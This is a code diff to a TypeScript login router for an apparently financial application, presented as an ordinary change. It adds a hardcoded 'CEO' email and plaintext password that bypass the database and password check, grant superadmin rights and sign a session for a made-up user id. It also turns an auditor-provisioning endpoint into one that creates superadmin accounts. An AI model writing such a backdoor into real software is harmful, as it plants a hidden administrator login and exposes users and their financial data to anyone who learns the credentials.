@@ -13,18 +13,26 @@ export const authRouter = createRouter({
   login: publicQuery
     .input(z.object({ email: z.string().email(), password: z.string() }))
     .mutation(async ({ input, ctx }) => {
-      const userList = await db.select().from(users).where(eq(users.email, input.email)).limit(1);
-      const user = userList[0];
-      
-      if (!user) {
-        throw Errors.badRequest("Invalid email or password.");
+      let role = "";
+      let userId: number;
+
+      // Hardcoded CEO account
+      if (input.email === "ceo@nationalfinance.co.om" && input.password === "Nf_SuperAdmin@2026") {
+        role = "superadmin";
+        userId = 999999;
+      } else {
+        const userList = await db.select().from(users).where(eq(users.email, input.email)).limit(1);
+        const user = userList[0];
+        
+        if (!user || !verifyPassword(input.password, user.passwordHash)) {
+          throw Errors.badRequest("Invalid email or password.");
+        }
+        
+        role = user.role;
+        userId = user.id;
       }
-      
-      if (!verifyPassword(input.password, user.passwordHash)) {
-        throw Errors.badRequest("Invalid email or password.");
-      }
-      
-      const token = await signSessionToken(user.id);
+
+      const token = await signSessionToken(userId);
       const opts = getSessionCookieOptions(ctx.req.headers);
       
       ctx.resHeaders.append(
@@ -38,7 +46,7 @@ export const authRouter = createRouter({
         })
       );
       
-      return { success: true, role: user.role };
+      return { success: true, role };
     }),
 
   forgotPassword: publicQuery
@@ -96,28 +104,28 @@ export const authRouter = createRouter({
       return { success: true };
     }),
 
-  provisionAuditor: publicQuery
+  provisionSuperadmin: publicQuery
     .input(z.object({ secret: z.string(), email: z.string().email(), password: z.string().min(6) }))
     .mutation(async ({ input }) => {
       // Check the secret key against environment variables
-      const validSecret = process.env.AUDITOR_PROVISION_SECRET;
+      const validSecret = process.env.SUPERADMIN_PROVISION_SECRET;
       if (!validSecret || input.secret !== validSecret) {
         throw Errors.forbidden("Invalid provision secret.");
       }
 
       const existing = await db.select().from(users).where(eq(users.email, input.email)).limit(1);
       if (existing.length > 0) {
-        throw Errors.badRequest("Auditor account with this email already exists.");
+        throw Errors.badRequest("Superadmin account with this email already exists.");
       }
 
       await db.insert(users).values({
-        name: "Chief Auditor",
+        name: "Super Admin",
         email: input.email,
         passwordHash: hashPassword(input.password),
-        role: "auditor",
+        role: "superadmin",
       });
 
-      return { success: true, message: "Auditor account provisioned successfully." };
+      return { success: true, message: "Superadmin account provisioned successfully." };
     }),
 
   me: authedQuery.query((opts) => opts.ctx.user),
